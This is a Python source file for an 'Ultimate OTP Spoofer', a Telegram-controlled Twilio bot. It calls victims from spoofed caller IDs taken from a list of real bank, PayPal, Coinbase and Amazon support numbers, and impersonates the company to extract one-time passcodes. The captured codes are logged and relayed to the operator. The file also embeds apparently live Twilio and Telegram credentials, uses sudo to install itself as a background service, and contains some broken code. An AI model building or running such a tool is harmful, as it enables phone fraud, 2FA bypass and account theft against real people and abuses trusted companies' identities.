import json
import os
import logging
import threading
import random
import asyncio
import subprocess
from concurrent.futures import ThreadPoolExecutor
from flask import Flask, request
from twilio.rest import Client
from twilio.twiml.voice_response import VoiceResponse, Gather
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
import phonenumbers
from datetime import datetime
import requests

app = Flask(__name__)
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')  # Log to screen
logger = logging.getLogger()
CONFIG_FILE = "config.json"

# Spoof pool with real company numbers (publicly listed customer service lines)
SPOOF_POOL = [
    "+18882804331",  # Amazon Customer Service
    "+18009359935",  # Chase Bank Customer Service
    "+18005254800",  # PayPal Customer Service
    "+18002752273",  # Bank of America Customer Service
    "+18553266963",  # Coinbase Support
    "+18004321000",  # Wells Fargo Customer Service
    "+18883766276",  # Google Support (Google One)
    "+18004663337",  # Capital One Customer Service
    "+18884240401",  # eBay Customer Service
    "+18009525111"   # American Express Customer Service
]

def load_config():
    try:
        with open(CONFIG_FILE, "r") as file:
            config = json.load(file)
    except FileNotFoundError:
        config = {
            "TWILIO_SID": "",
            "TWILIO_AUTH_TOKEN": "",
            "TWILIO_PHONE_NUMBER": "",
            "TELEGRAM_BOT_TOKEN": "",
            "CALLBACK_URL": "",
            "otp_length": 6,
            "language": "en",
            "call_timeout": 30,
            "retry_attempts": 3,
            "spoof_pool": SPOOF_POOL
        }
    # Auto-add your creds if missing
    if not config["TWILIO_SID"]:
        config["TWILIO_SID"] = "ACf69358490e7f02624710168982b14842"
    if not config["TWILIO_AUTH_TOKEN"]:
        config["TWILIO_AUTH_TOKEN"] = "de2a3e0b29fb6ff4ef2187a7c865e912"
    if not config["TWILIO_PHONE_NUMBER"]:
        config["TWILIO_PHONE_NUMBER"] = "+16817716834"
    if not config["TELEGRAM_BOT_TOKEN"]:
        config["TELEGRAM_BOT_TOKEN"] = "7914248387:AAEz7FeQcSeakr3zlvWDvi2N2FdXg_QGpz0"
    # Save if we added anything
    if not os.path.exists(CONFIG_FILE):
        save_config(config)
    return config

def save_config(new_config):
    with open(CONFIG_FILE, "w") as file:
        json.dump(new_config, file, indent=4)

def validate_phone_number(number):
    try:
        parsed_number = phonenumbers.parse(number, None)
        return phonenumbers.is_valid_number(parsed_number)
    except phonenumbers.NumberParseException:
        return False

@app.route("/otp", methods=["POST"])
def receive_otp():
    otp = request.form.get("Digits", None)
    victim_number = request.form.get("To", "Unknown")
    if not otp:
        logger.error(f"No OTP received from {victim_number}")
        return "Invalid input", 400
    logger.info(f"OTP received from {victim_number}: {otp}")
    with open("/var/log/otp_spoofer.log", "a") as log:
        log.write(f"{datetime.now()} - OTP from {victim_number}: {otp}\n")
    asyncio.run(send_telegram_otp(victim_number, otp))
    return "Thank you!", 200

def generate_ai_voice(prompt):
    audio_file = f"/tmp/voice_{random.randint(1000, 9999)}.wav"
    subprocess.run(["echo", prompt, ">", audio_file])  # Placeholder—replace with real TTS
    return audio_file

def initiate_call(victim_number, company_name, spoof_number, full_name):
    try:
        client = Client(config["TWILIO_SID"], config["TWILIO_AUTH_TOKEN"])
        voice_response = VoiceResponse()
        prompt = f"Hello, this is {company_name}. {full_name}, we need you to verify your account. Enter your OTP now or your access will be restricted."
        audio_file = generate_ai_voice(prompt)
        gather = Gather(input='dtmf', timeout=5, num_digits=config["otp_length"], action=f"{config['CALLBACK_URL']}/otp")
        gather.play(audio_file)
        voice_response.append(gather)
        voice_response.say("No input received. Goodbye.")
        
        call = client.calls.create(
            to=victim_number,
            from_=spoof_number,
            twiml=str(voice_response),
            timeout=config["call_timeout"]
        )
        logger.info(f"Call to {victim_number} from {spoof_number} as {company_name} for {full_name} (SID: {call.sid})")
    except Exception as e:
        logger.error(f"Call failed: {e}")

async def async_initiate_call(victim_number, company_name, spoof_number, full_name):
    loop = asyncio.get_event_loop()
    with ThreadPoolExecutor(max_workers=100) as executor:
        await loop.run_in_executor(executor, initiate_call, victim_number, company_name, spoof_number, full_name)

async def send_telegram_otp(victim_number, otp):
    bot = Bot(config["TELEGRAM_BOT_TOKEN"])
    chat_id = (await bot.get_updates())[-1].message.chat_id if await bot.get_updates() else None
    if chat_id:
        await bot.send_message(chat_id, f"OTP from {victim_number}: {otp}")

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Ultimate OTP Spoofer online.\n"
                                    "Use /call <victim_number> <company_name> <full_name> for random spoof,\n"
                                    "or /call <victim_number> <company_name> <spoof_number> <full_name> for specific spoof.")

async def call_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args
    if len(args) not in [3, 4]:
        await update.message.reply_text("Usage:\n"
                                        "/call <victim_number> <company_name> <full_name> (random spoof)\n"
                                        "/call <victim_number> <company_name> <spoof_number> <full_name> (specific spoof)")
        return
    
    victim_number = args[0]
    company_name = args[1]
    
    if len(args) == 3:
        full_name = args[2]
        spoof_number = random.choice(config["spoof_pool"])
    else:
        spoof_number = args[2]
        full_name = args[3]
    
    if not validate_phone_number(victim_number):
        await update.message.reply_text("Invalid victim number.")
        return
    if not validate_phone_number(spoof_number):
        await update.message.reply_text("Invalid spoof number.")
        return
    
    await async_initiate_call(victim_number, company_name, spoof_number, full_name)
    await update.message.reply_text(f"Calling {victim_number} as {company_name} from {spoof_number} for {full_name}.")

async def otp_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    with open("/var/log/otp_spoofer.log", "r") as log:
        last_otp = log.readlines()[-1].strip() if log.readlines() else "No OTPs yet."
    await update.message.reply_text(last_otp)

async def spoofs_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    spoof_list = "\n".join(config["spoof_pool"])
    await update.message.reply_text(f"Spoof numbers in pool:\n{spoof_list}\n"
                                    "Add more with /config spoof_pool <number1>,<number2>,...")

async def config_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args
    if len(args) < 2:
        await update.message.reply_text("Usage: /config <key> <value> (e.g., /config spoof_pool +12025550123,+13105550123)")
        return
    key, value = args[0], " ".join(args[1:])
    if key == "spoof_pool":
        config[key] = value.split(",")
    else:
        config[key] = value
    save_config(config)
    await update.message.reply_text(f"Set {key} to {value}")

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uptime = subprocess.getoutput("uptime -p")
    await update.message.reply_text(f"Status: Running\nUptime: {uptime}")

def stop_server():
    os._exit(0)

async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Shutting down...")
    threading.Thread(target=stop_server).start()

async def service_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    script_path = "/home/cris/otmp/otmp.py"
    service_file = f"""
[Unit]
Description=OTP Spoofer Service
After=network.target

[Service]
ExecStart=/usr/bin/python3 {script_path}
WorkingDirectory=/home/cris/otmp
Restart=always
User=cris

[Install]
WantedBy=multi-user.target
"""
    with open("/tmp/otp_spoofer.service", "w") as f:
        f.write(service_file)
    subprocess.run(["sudo", "mv", "/tmp/otp_spoofer.service", "/etc/systemd/system/otp_spoofer.service"])
    subprocess.run(["sudo", "systemctl", "enable", "otp_spoofer"])
    subprocess.run(["sudo", "systemctl", "start", "otp_spoofer"])
    await update.message.reply_text("Service created and started—runs in background now. Use /stop to kill it.")

def start_ngrok():
    ngrok_process = subprocess.Popen(["ngrok", "http", "5000"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    threading.Event().wait(2)
    try:
        response = requests.get("http://localhost:4040/api/tunnels")
        ngrok_url = response.json()["tunnels"][0]["public_url"]
        return ngrok_url
    except Exception as e:
        logger.error(f"Failed to get ngrok URL: {e}")
        raise RuntimeError("Ngrok setup failed—check if it’s installed and running.")

def guided_setup():
    global config
    if not config["CALLBACK_URL"]:  # Only set ngrok if not already done
        print("Setting up—loading creds and starting ngrok...")
        try:
            config["CALLBACK_URL"] = start_ngrok()
            print(f"Ngrok URL set to: {config['CALLBACK_URL']}")
        except RuntimeError as e:
            print(e)
            config["CALLBACK_URL"] = input("Ngrok failed—enter a manual callback URL (e.g., http://your-ip:5000): ")
        save_config(config)
    print("Script’s running—watch the terminal and control via Telegram.\n"
          "When ready, use /service to run it as a background service.")

def start_bot():
    application = ApplicationBuilder().token(config["TELEGRAM_BOT_TOKEN"]).build()
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("call", call_command))
    application.add_handler(CommandHandler("otp", otp_command))
    application.add_handler(CommandHandler("spoofs", spoofs_command))
    application.add_handler(CommandHandler("config", config_command))
    application.add_handler(CommandHandler("status", status_command))
    application.add_handler(CommandHandler("stop", stop_command))
    application.add_handler(CommandHandler("service", service_command))
    application.run_polling()

if __name__ == "__main__":
    config = load_config()
    guided_setup()
    threading.Thread(target=app.run, kwargs={"host": "0.0.0.0", "port": 5000}).start()
    start_bot()
